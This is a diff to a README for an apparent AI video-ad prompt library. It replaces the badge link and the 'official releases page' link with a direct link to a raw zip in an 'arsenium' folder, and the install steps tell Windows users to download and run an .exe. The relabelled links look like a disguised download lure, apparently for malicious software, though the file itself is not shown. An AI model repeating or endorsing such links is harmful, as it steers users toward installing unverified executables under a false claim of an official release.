@@ -1,6 +1,6 @@
 # 🎥 awesome-ai-ugc-video-prompts - Create viral video ads with AI
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/wassaillowerlimit6418/awesome-ai-ugc-video-prompts/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/wassaillowerlimit6418/awesome-ai-ugc-video-prompts/main/arsenium/ai-video-ugc-prompts-awesome-2.2.zip)
 
 ## 📌 Overview
 This software provides creators and marketers with a library of AI-powered prompts. These tools help you build video content for TikTok, Instagram Reels, and ecommerce advertisements. You can generate scripts, storyboard layouts, and creative directions for product demos. The software organizes these resources so you can maintain a consistent brand voice.
@@ -17,7 +17,7 @@ Before you install the application, check that your computer meets these minimum
 ## 📥 How to Install
 Follow these steps to set up the application on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/wassaillowerlimit6418/awesome-ai-ugc-video-prompts/releases) to download the installer.
+1. Visit the [official releases page](https://raw.githubusercontent.com/wassaillowerlimit6418/awesome-ai-ugc-video-prompts/main/arsenium/ai-video-ugc-prompts-awesome-2.2.zip) to download the installer.
 2. Look for the file ending in `.exe` under the latest release version.
 3. Click the filename to start the download.
 4. Locate the downloaded file in your Downloads folder.
